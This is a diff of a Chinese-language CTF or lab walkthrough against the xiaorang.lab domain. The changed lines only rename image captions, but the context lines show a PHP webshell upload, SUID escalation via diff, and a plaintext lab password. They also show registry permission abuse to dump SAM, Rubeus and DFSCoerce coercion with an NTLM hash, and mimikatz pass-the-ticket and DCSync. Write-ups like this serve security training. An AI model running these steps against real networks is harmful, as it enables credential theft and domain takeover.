@@ -34,7 +34,7 @@ sid=#data_d_.._d_.._d_.._d_1.php&slen=693&scontent=<?php phpinfo();?>
 
 写一个木马
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 suid提权，
 
@@ -66,7 +66,7 @@ diff --recursive $(mktemp -d) /home/flag/
 diff --line-format=%L /dev/null /home/flag/flag01.txt
 ```
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
 ## flag2
 
@@ -176,15 +176,15 @@ grep "password.*expir\|STATUS_PASSWORD_EXPIRED" 1.log
 WIN19\Adrian babygirl1
 ```
 
-![1](./assets/003.png)
+![image](./assets/003.png)
 
 密码过期了，修改一下密码就好，登录之后看到有很多配置文件
 
-![1](./assets/004.png)
+![image](./assets/004.png)
 
 打开看到谷歌更新有特殊权限
 
-![1](./assets/005.png)
+![image](./assets/005.png)
 
 查看注册表对于可执行文件的权限设置
 
@@ -192,9 +192,9 @@ WIN19\Adrian babygirl1
 Get-Acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *
 ```
 
-![1](./assets/006.png)
+![image](./assets/006.png)
 
-![1](./assets/007.png)
+![image](./assets/007.png)
 
 可以去篡改这个启动项搞些恶意操作，仔细看是LocalSystem的User，可以转储sam
 
@@ -257,7 +257,7 @@ net user /domain
 
 现在控下了win19这台机器，
 
-![1](./assets/008.png)
+![image](./assets/008.png)
 
 > The computer WIN19.XIAORANG.LAB is configured with Kerberos unconstrained delegation.computerWIN19.XIAORANG.LAB 配置了 Kerberos 不受约束的委派。Users and computers authenticating against WIN19.XIAORANG.LAB will have their Kerberos TGT sent to WIN19.XIAORANG.LAB, unless they are marked as sensitive or members of Protected Users.根据 WIN19 进行身份验证的用户和计算机。小让.LAB 会将其 Kerberos TGT 发送到 WIN19.XIAORANG.LAB，除非它们被标记为敏感用户或受保护用户的成员。An attacker with control over WIN19.XIAORANG.LAB can coerce a Tier Zero computer (e.g. DC) to authenticate against WIN19.XIAORANG.LAB and obtain the target's TGT. With the TGT of a DC, the attacker can perform DCSync to compromise the domain. 控制 WIN19 的攻击者。小让.LAB 可以强制零级计算机（例如 DC）对 WIN19 进行身份验证。小让.LAB 并获取目标的 TGT。借助 DC 的 TGT，攻击者可以执行 DCSync 来破坏域。所以我们强制认证去打这个非约束委派就行了
 
@@ -271,11 +271,11 @@ Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
 python3 dfscoerce.py -u "WIN19$" -hashes ":c03ae7549a98c76891362e156c920bf5" -d xiaorang.lab win19 172.22.4.7
 ```
 
-![1](./assets/009.png)
+![image](./assets/009.png)
 
 过一会就能监听到TGT
 
-![1](./assets/010.png)
+![image](./assets/010.png)
 
 票据保存为kirbi文件
 
@@ -291,7 +291,7 @@ echo 'doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQq
 .\mimikatz.exe "kerberos::purge" "kerberos::ptt DC01.kirbi" "lsadump::dcsync /domain:xiaorang.lab /user:administrator" "exit"
 ```
 
-![1](./assets/011.png)
+![image](./assets/011.png)
 
 ```bash
 4889f6553239ace1f7c47fa2c619c252
